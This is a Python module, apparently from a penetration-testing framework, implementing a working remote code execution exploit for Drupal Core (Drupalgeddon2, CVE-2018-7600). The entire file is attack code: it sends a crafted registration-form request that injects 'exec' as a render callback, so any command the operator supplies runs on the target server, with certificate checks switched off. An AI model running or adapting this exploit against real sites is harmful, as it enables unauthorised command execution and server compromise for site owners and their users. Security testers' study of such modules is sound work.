import requests
from urllib.parse import urljoin
from core.base_module import BaseModule
from rich.console import Console

class Drupalgeddon2Rce(BaseModule):
    """Exploits Drupal Core RCE (CVE-2018-7600)."""

    def get_options(self):
        """Returns the options for this module."""
        return {
            'URL': ['', 'The base URL of the Drupal site (e.g., http://drupal.example.com).'],
            'CMD': ['whoami', 'The command to execute.']
        }

    def run(self, options):
        """Executes the Drupalgeddon2 exploit."""
        url = options.get('URL')
        cmd = options.get('CMD')
        console = Console()

        if not url:
            console.print("[!] URL must be set.", style="bold red")
            return

        target_url = urljoin(url, 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax')
        payload = {
            'form_id': 'user_register_form',
            '_drupal_ajax': '1',
            'mail[#post_render][]': 'exec',
            'mail[#type]': 'markup',
            'mail[#markup]': cmd
        }

        console.print(f"[*] Targeting URL: {url}")
        console.print(f"[*] Attempting to execute command: {cmd}")

        try:
            response = requests.post(target_url, data=payload, timeout=20, verify=False)
            # A successful command execution might not return clean output.
            # We look for the absence of specific Drupal error messages.
            if response.status_code == 200 and "Drupal.Ajax" in response.text:
                # The command output is not directly in this response, but it has executed.
                # A more advanced version would write output to a file and retrieve it.
                console.print("[bold green][+] Exploit sent successfully! Command should have executed on the server.[/bold green]")
                console.print("[*] Note: Direct command output is not returned by this exploit method.")
            else:
                console.print("[!] The target does not appear to be vulnerable.", style="yellow")

        except requests.RequestException as e:
            console.print(f"[!] Request failed: {e}", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")